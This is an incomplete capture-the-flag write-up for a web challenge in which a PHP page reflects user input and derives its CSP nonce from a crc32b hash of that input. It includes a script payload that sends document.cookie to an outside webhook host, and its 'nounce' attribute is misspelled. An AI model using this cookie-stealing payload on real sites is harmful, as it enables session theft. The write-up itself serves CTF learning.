
# Recursive CSP
Description: the nonce isn't random, so how hard could this be?

(the flag is in the admin bot's cookie)

recursive-csp.mc.ax

Admin Bot

Solution:
+ given the source code:
```
<?php
  if (isset($_GET["source"])) highlight_file(__FILE__) && die();

  $name = "world";
  if (isset($_GET["name"]) && is_string($_GET["name"]) && strlen($_GET["name"]) < 128) {
    $name = $_GET["name"];
  }

  $nonce = hash("crc32b", $name);
  header("Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce' 'unsafe-inline'; base-uri 'none';");
?>
<!DOCTYPE html>
<html>
  <head>
    <title>recursive-csp</title>
  </head>
  <body>
    <h1>Hello, <?php echo $name ?>!</h1>
    <h3>Enter your name:</h3>
    <form method="GET">
      <input type="text" placeholder="name" name="name" />
      <input type="submit" />
    </form>
    <!-- /?source -->
  </body>
</html>
```
+ We can use unsafe-inline if we give the correct nounce which is made using crc32b algorithm.
+ Admin cookie will be the flag
+ if csp was not there our solution will be: <script>window.location="http://webhooksite.com/"+document.cookie</script>
+ As there is the nounce thing, our payload should be : <script nounce="sdfsd2324">window.location="http://webhooksite.com/"+document.cookie</script>
+ so basically we need to bruteforce the crc32b nounce.
+ 
